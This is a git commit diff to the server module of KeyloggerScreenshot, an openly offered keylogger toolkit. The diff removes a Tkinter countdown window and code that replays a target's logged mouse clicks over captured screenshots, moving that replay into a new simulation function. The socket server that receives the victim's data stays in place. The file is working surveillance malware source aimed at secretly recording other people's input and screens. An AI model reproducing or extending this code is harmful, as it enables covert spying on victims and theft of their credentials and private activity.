018e93db6e92a44ba967c4bf3417c7580c72224e
Fawaz <106278241+Kill0geR@users.noreply.github.com>
2023-04-03 22:52:18 +0200

    Update Server_keylogger.py

--- KeyloggerScreenshot/Server_keylogger.py
+++ KeyloggerScreenshot/Server_keylogger.py
@@ -1,15 +1,11 @@
-import PIL.Image
 import time
 import sys
 import socket
-import pyautogui as pg
 import os
-import threading
-import ast
 import BetterPrinting as bp
-import tkinter as tk
 from .Server_photos import ServerPhotos
 from .Port_data import get_working_ports
+from .Simulation_code import start_simulation
 
 class ServerKeylogger:
     # This is the class of the Server. Both Server should not be in the same file
@@ -54,65 +50,7 @@ class ServerKeylogger:
 
         return filename
 
-    def countdown(self):
-        global seconds
-        global startbutton
-        global tkWindow
-        real_sec = seconds
-        seconds = seconds + 4
-        # Plus four seconds because of the time the code sleeps
-
-        if sys.platform == "linux":
-            size = "295x367"
-        else:
-            size = "250x415"
-
-        tkWindow = tk.Tk()
-        tkWindow.geometry(size)
-        tkWindow.title('KeyloggerScreenshot')
-        minutes = seconds // 60
-        this_min = minutes * 60
-        this_sec = seconds - this_min
-        if minutes > 0:
-            print(f"This simulation will last for {minutes} minutes and {this_sec} seconds\n")
-        elif minutes > 0 and this_sec == 0:
-            print(f"This simulation will last for {minutes} minutes\n")
-        elif minutes == 0:
-            print(f"This simulation will last for {this_sec} seconds\n")
-
-        while seconds:  # Same like Timer Class
-            mins, secs = divmod(seconds, 60)
-            timer = '{:02d}:{:02d}'.format(mins, secs)
-            print(f"\rTime left: {timer}", end="")
-            time.sleep(1)
-            seconds -= 1
-
-        print("\nTHANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
-        # GUI BY: DYMA020
-        startbutton = tk.Button(tkWindow, text="Stop stimulation", command=self.changecol, height=10, width=30)
-        # Puts everything on place
-        startbutton.grid(row=1, column=0)
-        if real_sec < 60:
-            text = f"Simulation for {real_sec} seconds"
-        else:
-            m, s = divmod(real_sec, 60)
-            timer = '{:02d}:{:02d}'.format(m, s)
-            text = f"Simulation for {timer} minutes"
-        # Just for decoration
-        tk.Button(tkWindow, text=text, command=self.connection, height=10, width=30).grid(row=2, column=0)
-        tkWindow.mainloop()
-
-    def changecol(self):  # This function is here to if the simulation has ended
-        startbutton.configure(bg="red")
-        # This is the button
-        startbutton["text"] = "Stop simulation"
-        tkWindow.destroy()
-
-    def connection(self):
-        print("Successful connection")
-
     def start(self):
-        global seconds
         try:
             server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             server.bind((self.ip, self.port))
@@ -183,64 +121,7 @@ class ServerKeylogger:
                     print("\nTHANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
                     sys.exit()
 
-                mouse_coordinates = [mouse for mouse in os.listdir() if "mouseInfoLog" in mouse]
-                # Looks for coordinates in mouseInfoLog
-
-                if not mouse_coordinates:
-                    # If there isn't a file called mouseInfoLog it will destroy itself
-                    print("\nThe target hasn't clicked anything")
-                    print("THANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
-                    sys.exit()
-
-                every_coordinate = []
-                for each_core in mouse_coordinates:
-                    fhandle = open(each_core)
-                    for line in fhandle:
-                        if "[" in line:
-                            every_coordinate += ast.literal_eval(line)
-                            # This makes a list out of a string
-
-                img_files = [each_img for each_img in os.listdir() if "New_Image" in each_img]
-                # This checks for all Images in the directory
-
-                if not img_files:
-                    print('There is no "New_Image" in this directory')
-                    sys.exit()
-
-                pg.FAILSAFE = False
-                # This is for the corner allowance
-                img_seconds = 5.572
-                # This is the speed it takes to open the image
-                speed = 0.47
-                # This is the time each coordinate needs
-                sleep = 1.5
-                # This is the time where the code is taking a time out
-                one_coordinate = speed + sleep
-
-                duration_seconds = one_coordinate * len(every_coordinate)
-                one_image = duration_seconds + img_seconds
-                summed_up = one_image * len(img_files)
-                seconds = round(summed_up)
-
-                print(f"\nThe target has clicked {len(every_coordinate)} times on his screen")
-                print(f"{len(img_files)} Image files are being used")
-
-                threading_count = threading.Thread(target=self.countdown)
-                # The countdown will start
-                threading_count.start()
-
-                pg.sleep(4)
-                for image in img_files:
-                    im = PIL.Image.open(image)
-                    # Opens the image
-                    im.show()
-                    time.sleep(2)
-                    pg.press("f11")
-                    # Makes the image in the perfect resolution
-                    for x, y in every_coordinate:
-                        pg.moveTo(x, y, 0.3)
-                        time.sleep(sleep)
-                    pg.press("esc")
+                start_simulation()
 
         except OSError:
             working_port = get_working_ports()
